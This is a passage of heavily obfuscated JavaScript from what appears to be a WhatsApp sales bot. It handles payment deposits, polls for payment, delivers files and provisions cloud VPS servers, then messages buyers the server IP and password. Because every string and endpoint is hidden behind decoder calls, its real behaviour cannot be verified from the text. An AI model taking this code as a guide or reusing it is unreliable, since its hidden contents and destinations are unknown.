                        'text': _0x2a5309[_0x5d4417(0x24c)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x98d)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                tek = _0x156b97[_0x5d4417(0xec1) + 'e']();
                let _0x589dbf = {};
                if (_0x2a5309[_0x5d4417(0x1010)](tek, '1'))
                    _0x589dbf[_0x5d4417(0x763)] = _0x2a5309[_0x5d4417(0x2e0)], _0x589dbf[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xea9)], _0x589dbf[_0x5d4417(0xace)] = _0x2a5309[_0x5d4417(0xc40)];
                else {
                    if (_0x2a5309[_0x5d4417(0x1df)](tek, '2'))
                        _0x589dbf[_0x5d4417(0x763)] = _0x2a5309[_0x5d4417(0x684)], _0x589dbf[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xd59)], _0x589dbf[_0x5d4417(0xace)] = _0x2a5309[_0x5d4417(0x117b)];
                    else {
                        if (_0x2a5309[_0x5d4417(0x32d)](tek, '3'))
                            _0x589dbf[_0x5d4417(0x763)] = _0x2a5309[_0x5d4417(0x4df)], _0x589dbf[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x111f)], _0x589dbf[_0x5d4417(0xace)] = _0x2a5309[_0x5d4417(0x239)];
                        else
                            return;
                    }
                }
                const _0x1b46ce = global[_0x5d4417(0x8cb) + _0x5d4417(0x51f)], _0x33fb6b = _0x2a5309[_0x5d4417(0x215)](_0x2a5309[_0x5d4417(0xac7)](Number, _0x589dbf[_0x5d4417(0x4a3)]), _0x2a5309[_0x5d4417(0xac3)](_0x2ac61a, 0x22e9 + 0x2 * -0x12fb + 0x37b, -0x325 * -0x5 + -0xa1f * -0x2 + 0x2b1 * -0xd)), _0x5eb4c8 = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x11b4) + _0x5d4417(0x11dd) + _0x5d4417(0x105e) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0x236) + _0x33fb6b + _0x5d4417(0x558) + _0x1b46ce), _0x311e08 = _0x5d4417(0x733) + _0x5d4417(0xe27) + _0x5d4417(0xe0c) + _0x5d4417(0x111c) + _0x5eb4c8[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0x5c2)](toIDR, _0x5eb4c8[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0x9f9)) + _0x589dbf[_0x5d4417(0xace)] + (_0x5d4417(0xb33) + _0x5d4417(0xc05) + _0x5d4417(0xe66) + _0x5d4417(0x934) + _0x5d4417(0x1153) + _0x5d4417(0xc09) + _0x5d4417(0xff8) + _0x5d4417(0x3ce) + _0x5d4417(0x828) + _0x5d4417(0x911) + _0x5d4417(0x3fd) + _0x5d4417(0x8ad) + _0x5d4417(0xebe) + _0x5d4417(0xd5e) + _0x5d4417(0xc84) + _0x5d4417(0x104b) + _0x5d4417(0x3f6) + _0x5d4417(0xb92) + _0x5d4417(0x993) + _0x5d4417(0x8bd) + _0x5d4417(0x6a2) + _0x5d4417(0x2ce) + _0x5d4417(0xaee) + _0x5d4417(0x1205) + _0x5d4417(0x111e) + _0x5d4417(0xf72) + _0x5d4417(0xce7));
                let _0x480883 = await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x5d4417(0x758),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x644)] },
                            'type': 0x1
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'image': { 'url': _0x5eb4c8[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xa8a)] },
                    'caption': _0x311e08,
                    'contextInfo': { 'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]] }
                });
                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = !![], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] = {
                    'msg': _0x480883,
                    'chat': _0xedb653[_0x5d4417(0xeee)],
                    'idDeposit': _0x5eb4c8[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)],
                    'amount': _0x5eb4c8[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)][_0x5d4417(0xef4)](),
                    'exp': function () {
                        const _0x53bf2c = _0x5d4417;
                        _0x2a5309[_0x53bf2c(0x1047)](setTimeout, async () => {
                            const _0x961341 = _0x53bf2c;
                            if (_0x2a5309[_0x961341(0xfa8)](db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x6b7) + _0x961341(0x350)], !![]) && db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)] && _0x2a5309[_0x961341(0x47e)](db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x237)], db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x237)])) {
                                const _0x3b6665 = _0x2a5309[_0x961341(0xe1b)][_0x961341(0xc6c)]('|');
                                let _0x482260 = 0x717 + -0x2681 + 0x1 * 0x1f6a;
                                while (!![]) {
                                    switch (_0x3b6665[_0x482260++]) {
                                    case '0':
                                        await _0x57ed02[_0x961341(0x367) + 'e'](db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x9e2)], { 'delete': db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x10e8)][_0x961341(0x1185)] });
                                        continue;
                                    case '1':
                                        db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x6b7) + _0x961341(0x350)] = ![];
                                        continue;
                                    case '2':
                                        await _0x2a5309[_0x961341(0x53a)](clearInterval, db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x782)]);
                                        continue;
                                    case '3':
                                        await _0x57ed02[_0x961341(0x367) + 'e'](db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x9e2)], { 'text': _0x2a5309[_0x961341(0xb95)] }, { 'quoted': db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)][_0x961341(0x10e8)] });
                                        continue;
                                    case '4':
                                        delete db[_0x961341(0xf2f)][_0xedb653[_0x961341(0xeee)]][_0x961341(0x7bd)];
                                        continue;
                                    }
                                    break;
                                }
                            }
                        }, 0x43f26 + -0x4cbed + 0x520a7);
                    }
                }, await db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]();
                while (_0x2a5309[_0x5d4417(0xd83)](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)], !![]) && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) {
                    await _0x2a5309[_0x5d4417(0x99b)](sleep, 0x1630 + 0x22e7 + 0xbd * -0x23);
                    const _0x5ea435 = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x1b5) + _0x5d4417(0xb96) + _0x5d4417(0xea7) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0xdfc) + global[_0x5d4417(0xc77) + _0x5d4417(0xaab)] + _0x5d4417(0x8e3) + global[_0x5d4417(0x1145) + _0x5d4417(0x9af)]), _0x173bbb = await _0x5ea435[_0x5d4417(0x1059)];
                    if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && _0x2a5309[_0x5d4417(0x5f4)](_0x173bbb?.[_0x5d4417(0x237)], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)])) {
                        const _0x33c19a = _0x2a5309[_0x5d4417(0xc94)][_0x5d4417(0xc6c)]('|');
                        let _0x1d9c29 = 0x221 + -0x1076 + 0xe55 * 0x1;
                        while (!![]) {
                            switch (_0x33c19a[_0x1d9c29++]) {
                            case '0':
                                await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'delete': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)][_0x5d4417(0x1185)] });
                                continue;
                            case '1':
                                await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'text': _0x5d4417(0x8db) + _0x5d4417(0x78a) + _0x5d4417(0x5a1) + _0x5d4417(0x6d9) + _0x5d4417(0x191) + db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0xf1d)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0xe04)](toIDR, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0x9f9)) + _0x589dbf[_0x5d4417(0xace)] + '\x0a' }, { 'quoted': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)] });
                                continue;
                            case '2':
                                delete db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)];
                                continue;
                            case '3':
                                await _0x2a5309[_0x5d4417(0xeaa)](clearInterval, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]);
                                continue;
                            case '4':
                                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                                    'document': await fs[_0x5d4417(0xf73) + 'nc'](_0x589dbf[_0x5d4417(0x763)]),
                                    'mimetype': _0x2a5309[_0x5d4417(0x4e7)],
                                    'fileName': _0x589dbf[_0x5d4417(0xace)]
                                }, { 'quoted': null });
                                continue;
                            case '5':
                                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = ![];
                                continue;
                            case '6':
                                var _0x16d8bc = db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)];
                                continue;
                            }
                            break;
                        }
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x653)]: {
                if (_0xedb653[_0x5d4417(0xe3e)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xdfd)]);
                if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3ad)]);
                if (!_0x156b97)
                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0xf7a)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x383)],
                                                'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                                'rows': [
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x120a)],
                                                        'description': _0x2a5309[_0x5d4417(0xf30)],
                                                        'id': _0x2a5309[_0x5d4417(0x2d3)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0xda2)],
                                                        'description': _0x2a5309[_0x5d4417(0x95d)],
                                                        'id': _0x2a5309[_0x5d4417(0x7a8)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x756)],
                                                        'description': _0x2a5309[_0x5d4417(0x1204)],
                                                        'id': _0x2a5309[_0x5d4417(0x92c)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x5c9)],
                                                        'description': _0x2a5309[_0x5d4417(0x5dd)],
                                                        'id': _0x2a5309[_0x5d4417(0xeeb)]
                                                    }
                                                ]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0x9e1)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x45e)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                tek = _0x156b97[_0x5d4417(0xec1) + 'e']();
                let _0xbede4c = {};
                if (_0x2a5309[_0x5d4417(0xe7c)](tek, '1'))
                    _0xbede4c[_0x5d4417(0xae5)] = _0x2a5309[_0x5d4417(0x23e)], _0xbede4c[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x3f3)];
                else {
                    if (_0x2a5309[_0x5d4417(0xcfd)](tek, '2'))
                        _0xbede4c[_0x5d4417(0xae5)] = _0x2a5309[_0x5d4417(0xb0a)], _0xbede4c[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xea9)];
                    else {
                        if (_0x2a5309[_0x5d4417(0x10aa)](tek, '3'))
                            _0xbede4c[_0x5d4417(0x673)] = _0x2a5309[_0x5d4417(0x1154)], _0xbede4c[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x581)];
                        else {
                            if (_0x2a5309[_0x5d4417(0xecd)](tek, '4'))
                                _0xbede4c[_0x5d4417(0xae5)] = _0x2a5309[_0x5d4417(0x663)], _0xbede4c[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x3b4)];
                            else
                                return _0xedb653[_0x5d4417(0x105d)](_0x4417bc);
                        }
                    }
                }
                const _0x49c409 = global[_0x5d4417(0x8cb) + _0x5d4417(0x51f)], _0x1e6854 = _0x2a5309[_0x5d4417(0xc76)](_0x2a5309[_0x5d4417(0x10b2)](Number, _0xbede4c[_0x5d4417(0x4a3)]), _0x2a5309[_0x5d4417(0x845)](_0x2ac61a, -0x189f + -0x611 + 0xe * 0x239, -0x31 * 0x2a + -0xc42 + -0xaa3 * -0x2)), _0xab420b = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x11b4) + _0x5d4417(0x11dd) + _0x5d4417(0x105e) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0x236) + _0x1e6854 + _0x5d4417(0x558) + _0x49c409), _0x11f895 = _0x5d4417(0x733) + _0x5d4417(0xe27) + _0x5d4417(0xe0c) + _0x5d4417(0x111c) + _0xab420b[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0x405)](toIDR, _0xab420b[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0x59d) + _0x5d4417(0x7ce) + _0x5d4417(0x393) + _0x5d4417(0xac1) + _0x5d4417(0x1d0) + _0x5d4417(0x10b8) + _0x5d4417(0x7a3) + _0x5d4417(0xd2c) + _0x5d4417(0x1a4) + _0x5d4417(0x8d5) + _0x5d4417(0xa61) + _0x5d4417(0x10ac) + _0x5d4417(0x91c) + _0x5d4417(0x1153) + _0x5d4417(0xcb2) + _0x5d4417(0x1003) + _0x5d4417(0x189) + _0x5d4417(0x1153) + _0x5d4417(0x420) + _0x5d4417(0x4f6) + _0x5d4417(0x3df) + _0x5d4417(0x75d) + _0x5d4417(0x1187) + _0x5d4417(0x658) + _0x5d4417(0x113c) + _0x5d4417(0x100d) + _0x5d4417(0x758) + _0x5d4417(0x535) + _0x5d4417(0x196));
                let _0x39ad29 = await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x5d4417(0x758),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x644)] },
                            'type': 0x1
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'image': { 'url': _0xab420b[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xa8a)] },
                    'caption': _0x11f895,
                    'contextInfo': { 'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]] }
                });
                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = !![], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] = {
                    'msg': _0x39ad29,
                    'chat': _0xedb653[_0x5d4417(0xeee)],
                    'idDeposit': _0xab420b[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)],
                    'amount': _0xab420b[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)][_0x5d4417(0xef4)](),
                    'exp': function () {
                        const _0x358224 = _0x5d4417, _0x2f5ac7 = {
                                'HbUgY': function (_0x3439d8, _0x48a1a0) {
                                    const _0x47001a = _0x4f4e;
                                    return _0x2a5309[_0x47001a(0x1df)](_0x3439d8, _0x48a1a0);
                                },
                                'HSram': _0x2a5309[_0x358224(0x2c6)],
                                'bmRII': function (_0x48e1b0, _0x1c601a) {
                                    const _0x3dc4ba = _0x358224;
                                    return _0x2a5309[_0x3dc4ba(0x5ca)](_0x48e1b0, _0x1c601a);
                                },
                                'mfKGr': _0x2a5309[_0x358224(0xb95)]
                            };
                        _0x2a5309[_0x358224(0x1047)](setTimeout, async () => {
                            const _0x169a66 = _0x358224;
                            if (_0x2f5ac7[_0x169a66(0x1067)](db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x6b7) + _0x169a66(0x350)], !![]) && db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)] && _0x2f5ac7[_0x169a66(0x1067)](db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x237)], db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x237)])) {
                                const _0x134f9f = _0x2f5ac7[_0x169a66(0x295)][_0x169a66(0xc6c)]('|');
                                let _0xc8bb2c = -0xbf1 + -0xa01 * 0x3 + -0x29f4 * -0x1;
                                while (!![]) {
                                    switch (_0x134f9f[_0xc8bb2c++]) {
                                    case '0':
                                        await _0x57ed02[_0x169a66(0x367) + 'e'](db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x9e2)], { 'delete': db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x10e8)][_0x169a66(0x1185)] });
                                        continue;
                                    case '1':
                                        await _0x2f5ac7[_0x169a66(0xde8)](clearInterval, db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x782)]);
                                        continue;
                                    case '2':
                                        delete db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)];
                                        continue;
                                    case '3':
                                        db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x6b7) + _0x169a66(0x350)] = ![];
                                        continue;
                                    case '4':
                                        await _0x57ed02[_0x169a66(0x367) + 'e'](db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x9e2)], { 'text': _0x2f5ac7[_0x169a66(0x118a)] }, { 'quoted': db[_0x169a66(0xf2f)][_0xedb653[_0x169a66(0xeee)]][_0x169a66(0x7bd)][_0x169a66(0x10e8)] });
                                        continue;
                                    }
                                    break;
                                }
                            }
                        }, 0x29728 + 0xc091 * -0x1 + 0x67 * 0x6cf);
                    }
                }, await db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]();
                while (_0x2a5309[_0x5d4417(0xbb0)](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)], !![]) && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) {
                    await _0x2a5309[_0x5d4417(0x6d2)](sleep, 0x20af + 0x3233 + 0x3 * -0x1136);
                    const _0x5086af = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x1b5) + _0x5d4417(0xb96) + _0x5d4417(0xea7) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0xdfc) + global[_0x5d4417(0xc77) + _0x5d4417(0xaab)] + _0x5d4417(0x8e3) + global[_0x5d4417(0x1145) + _0x5d4417(0x9af)]), _0x16e18e = await _0x5086af[_0x5d4417(0x1059)];
                    if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && _0x2a5309[_0x5d4417(0x929)](_0x16e18e?.[_0x5d4417(0x237)], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)])) {
                        db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = ![], await _0x2a5309[_0x5d4417(0x61f)](clearInterval, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'text': _0x5d4417(0x8db) + _0x5d4417(0x78a) + _0x5d4417(0x5a1) + _0x5d4417(0x6d9) + _0x5d4417(0x191) + db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0xf1d)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0x1127)](toIDR, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0x59d) + _0x5d4417(0x7ce) + _0x5d4417(0x119d)) }, { 'quoted': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)] });
                        var _0x16d8bc = db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)];
                        let _0x414361 = _0x2a5309[_0x5d4417(0x110a)]('#', _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[-0x1 * 0x742 + 0x22a6 + -0x6d9 * 0x4]);
                        try {
                            let _0x55945c = {
                                    'name': _0x414361,
                                    'region': _0x2a5309[_0x5d4417(0xc55)],
                                    'size': _0xbede4c[_0x5d4417(0xae5)],
                                    'image': _0x2a5309[_0x5d4417(0xaa9)],
                                    'ssh_keys': null,
                                    'backups': ![],
                                    'ipv6': !![],
                                    'user_data': null,
                                    'private_networking': null,
                                    'volumes': null,
                                    'tags': ['T']
                                }, _0x1b2d60 = await _0x2a5309[_0x5d4417(0x11dc)](_0xcbd4eb);
                            _0x55945c[_0x5d4417(0xd14)] = _0x5d4417(0xeac) + _0x5d4417(0x480) + _0x5d4417(0xab9) + _0x1b2d60 + (_0x5d4417(0x717) + _0x5d4417(0xd88) + _0x5d4417(0x82c));
                            let _0x3f236a = await _0x2a5309[_0x5d4417(0x845)](fetch, _0x2a5309[_0x5d4417(0x592)], {
                                    'method': _0x2a5309[_0x5d4417(0x3a6)],
                                    'headers': {
                                        'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                        'Authorization': _0x2a5309[_0x5d4417(0x83c)](_0x2a5309[_0x5d4417(0xbee)], global[_0x5d4417(0xd5d) + _0x5d4417(0x18a)])
                                    },
                                    'body': JSON[_0x5d4417(0x78f)](_0x55945c)
                                }), _0x57c47f = await _0x3f236a[_0x5d4417(0x728)]();
                            if (_0x3f236a['ok']) {
                                let _0x5952cc = _0x57c47f[_0x5d4417(0x1ba)], _0x209124 = _0x5952cc['id'];
                                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x604) + _0x5d4417(0x219)), await new Promise(_0x5cc3ac => setTimeout(_0x5cc3ac, 0x10a7c + 0x1ae65 + -0x1ce81));
                                let _0x1c1b57 = await _0x2a5309[_0x5d4417(0x9c7)](fetch, _0x5d4417(0xb54) + _0x5d4417(0xc3d) + _0x5d4417(0xabb) + _0x5d4417(0x902) + '/' + _0x209124, {
                                        'method': _0x2a5309[_0x5d4417(0xea5)],
                                        'headers': {
                                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                            'Authorization': _0x2a5309[_0x5d4417(0xddc)](_0x2a5309[_0x5d4417(0xbee)], global[_0x5d4417(0xd5d) + _0x5d4417(0x18a)])
                                        }
                                    }), _0x41e6bd = await _0x1c1b57[_0x5d4417(0x728)](), _0x38c54a = _0x41e6bd[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'] && _0x2a5309[_0x5d4417(0xb79)](_0x41e6bd[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'][_0x5d4417(0xf65)], 0x13 * 0x1ba + -0x9d * -0xf + -0x2a01) ? _0x41e6bd[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'][0xb05 + 0x1af2 + -0x25f7 * 0x1][_0x5d4417(0xc59)] : _0x2a5309[_0x5d4417(0x8c6)], _0x17cd1a = _0x5d4417(0x1090) + _0x5d4417(0x923) + '\x0a\x0a';
                                _0x17cd1a += _0x5d4417(0x470) + _0x209124 + '\x0a', _0x17cd1a += _0x5d4417(0x54e) + _0x38c54a + '\x0a', _0x17cd1a += _0x5d4417(0x1e9) + _0x1b2d60, await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, { 'text': _0x17cd1a });
                            } else
                                throw new Error(_0x5d4417(0x55c) + _0x5d4417(0x9b2) + _0x57c47f[_0x5d4417(0x2f3)]);
                        } catch (_0xa93694) {
                            console[_0x5d4417(0xe78)](_0xa93694), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x119a) + _0x5d4417(0xd46) + _0x5d4417(0xcfa) + _0x5d4417(0xd17) + _0xa93694);
                        }
                        await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'delete': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)][_0x5d4417(0x1185)] }), delete db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)];
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x22c)]: {
                if (_0xedb653[_0x5d4417(0xe3e)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1121)]);
                if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3ad)]);
                if (!_0x156b97)
